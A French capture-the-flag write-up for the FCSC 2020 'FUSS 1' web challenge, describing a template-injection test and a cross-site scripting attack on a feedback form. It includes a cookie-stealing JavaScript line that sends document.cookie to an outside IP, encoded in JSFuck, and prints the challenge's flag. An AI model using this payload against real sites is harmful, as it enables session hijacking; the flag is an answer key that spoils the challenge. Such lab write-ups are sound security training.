
https://hackropole.fr/fr/challenges/web/fcsc2020-web-fuss-1/

## Description

On vous demande d’auditer cette solution de feedback dévéloppée par la société _Feedback Unlimited Secure Solutions_ (FUSS).

**Note :** Cette épreuve avait été proposée lors de la finale du FCSC 2020.

Cette épreuve a été découpée en trois parties :

- [FUSS 1](https://hackropole.fr/fr/challenges/web/fcsc2020-web-fuss-1/).
- [FUSS 2](https://hackropole.fr/fr/challenges/web/fcsc2020-web-fuss-2/).
- [FUSS 3](https://hackropole.fr/fr/challenges/web/fcsc2020-web-fuss-3/).

## Write Up

On arrive sur la page avec un feedback, on teste directement une SSTI :
![[Pasted image 20250206140853.png]]

Et on voit que ça marche :
![[Pasted image 20250206140905.png]]

On teste l'exploit en encodant 
```javascript
var i=new Image;i.src="http://192.168.0.28/?cookie="+document.cookie;
```
en JSFUCK.

On regarde sur le serveur et on reçoit bien le cookie :
![[Pasted image 20250206141029.png]]

Quand on se rend sur la page pour accéder au flag, on se retrouve bloqué. Je suppose donc de modifier le token par celui qu'on a réceptionné :
![[Pasted image 20250206141155.png]]

En ajoutant le token correspond, on arrive bien au résultat suivant :
![[Pasted image 20250206141318.png]]

Le flag est donc **FCSC{51165c5737a363413e769c27fe9f255383acacc137f87cca55d4f7314705fe82}**.